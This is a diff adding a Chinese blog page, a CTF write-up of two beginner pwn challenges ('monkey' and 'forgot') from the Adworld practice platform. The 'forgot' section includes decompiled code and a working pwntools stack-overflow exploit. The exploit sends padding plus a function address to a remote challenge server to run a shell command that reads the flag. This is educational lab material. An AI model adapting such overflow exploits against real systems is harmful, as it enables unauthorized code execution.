@@ -1,0 +1,167 @@
+
+<!DOCTYPE html>
+<html lang="" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>攻防世界_pwn_萌新入坑 - 知世の小屋</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="知世,"> 
+    <meta name="description" content="my blogs,
+很久没有写博客了,闲暇之余做做萌新入坑题
+
+monkey上来一开始check了一下试运行没得到啥有用的信息,然后就果断扔到IDA里了…紧接着就后悔了QAQ后来是了一下help(),发现里面内置了o,"> 
+    <meta name="author" content="知世"> 
+    <link rel="alternative" href="atom.xml" title="知世の小屋" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">知世の小屋</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="https://nightRainy.github.io"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">攻防世界_pwn_萌新入坑</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">攻防世界_pwn_萌新入坑</h1>
+        <div class="stuff">
+            <span>四月 13, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <blockquote>
+<p>很久没有写博客了,闲暇之余做做萌新入坑题</p>
+</blockquote>
+<h1 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h1><p>上来一开始check了一下试运行没得到啥有用的信息,然后就果断扔到IDA里了…紧接着就后悔了QAQ<br>后来是了一下help(),发现里面内置了os.system()函数,很好nc连上直接cat flag!</p>
+<h1 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">  RELRO:    Partial RELRO</span><br><span class="line">  Stack:    No canary found</span><br><span class="line">  NX:       NX enabled</span><br><span class="line">  PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先看一下保护,程序只开了NX和RELRO,然后甩进IDA里</span><br></pre></td></tr></table></figure>
+<p>int __cdecl main()<br>{<br>  size_t v0; // ebx<br>  char v2[32]; // [esp+10h] [ebp-74h]<br>  int (<em>v3)(); // [esp+30h] [ebp-54h]<br>  int (</em>v4)(); // [esp+34h] [ebp-50h]<br>  int (<em>v5)(); // [esp+38h] [ebp-4Ch]<br>  int (</em>v6)(); // [esp+3Ch] [ebp-48h]<br>  int (<em>v7)(); // [esp+40h] [ebp-44h]<br>  int (</em>v8)(); // [esp+44h] [ebp-40h]<br>  int (<em>v9)(); // [esp+48h] [ebp-3Ch]<br>  int (</em>v10)(); // [esp+4Ch] [ebp-38h]<br>  int (<em>v11)(); // [esp+50h] [ebp-34h]<br>  int (</em>v12)(); // [esp+54h] [ebp-30h]<br>  char s; // [esp+58h] [ebp-2Ch]<br>  int v14; // [esp+78h] [ebp-Ch]<br>  size_t i; // [esp+7Ch] [ebp-8h]</p>
+<p>  v14 = 1;<br>  v3 = sub_8048604;<br>  v4 = sub_8048618;<br>  v5 = sub_804862C;<br>  v6 = sub_8048640;<br>  v7 = sub_8048654;<br>  v8 = sub_8048668;<br>  v9 = sub_804867C;<br>  v10 = sub_8048690;<br>  v11 = sub_80486A4;<br>  v12 = sub_80486B8;<br>  puts(“What is your name?”);<br>  printf(“&gt; “);<br>  fflush(stdout);<br>  fgets(&amp;s, 32, stdin);<br>  sub_80485DD(&amp;s);<br>  fflush(stdout);<br>  printf(“I should give you a pointer perhaps. Here: %x\n\n”, sub_8048654);<br>  fflush(stdout);<br>  puts(“Enter the string to be validate”);<br>  printf(“&gt; “);<br>  fflush(stdout);<br>  __isoc99_scanf(“%s”, v2);<br>  for ( i = 0; ; ++i )<br>  {<br>    v0 = i;<br>    if ( v0 &gt;= strlen(v2) )<br>      break;<br>    switch ( v14 )<br>    {<br>      case 1:<br>        if ( sub_8048702(v2[i]) )<br>          v14 = 2;<br>        break;<br>      case 2:<br>        if ( v2[i] == 64 )<br>          v14 = 3;<br>        break;<br>      case 3:<br>        if ( sub_804874C(v2[i]) )<br>          v14 = 4;<br>        break;<br>      case 4:<br>        if ( v2[i] == 46 )<br>          v14 = 5;<br>        break;<br>      case 5:<br>        if ( sub_8048784(v2[i]) )<br>          v14 = 6;<br>        break;<br>      case 6:<br>        if ( sub_8048784(v2[i]) )<br>          v14 = 7;<br>        break;<br>      case 7:<br>        if ( sub_8048784(v2[i]) )<br>          v14 = 8;<br>        break;<br>      case 8:<br>        if ( sub_8048784(v2[i]) )<br>          v14 = 9;<br>        break;<br>      case 9:<br>        v14 = 10;<br>        break;<br>      default:<br>        continue;<br>    }<br>  }<br>  (*(&amp;v3 + –v14))();<br>  return fflush(stdout);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main函数很庞大，前面的几个函数都是用来输出一些反馈的，后面发现有fget()函数，很好，栈溢出石锤了</span><br></pre></td></tr></table></figure></p>
+<p>int sub_80486CC()<br>{<br>  char s; // [esp+1Eh] [ebp-3Ah]</p>
+<p>  snprintf(&amp;s, 0x32u, “cat %s”, “./flag”);<br>  return system(&amp;s);<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">然后又找到了这个函数,那么Exp就很明了了,只需要让程序跳转到神奇的函数就行了</span><br><span class="line">EXP如下:</span><br></pre></td></tr></table></figure></p>
+<p>from pwn import *</p>
+<p>#sh=process(‘./forgot’)<br>sh=remote(‘111.198.29.45’,31825)</p>
+<p>cat_flag=0x80486CC<br>payload=’a’*(0x24)+p32(cat_flag)</p>
+<p>sh.recvuntil(‘?’)<br>sh.sendline(“aaa”)<br>sh.recvuntil(‘&gt;’)<br>sh.sendline(payload)<br>print sh.recvall()<br><code>`</code></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                    
+                        <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
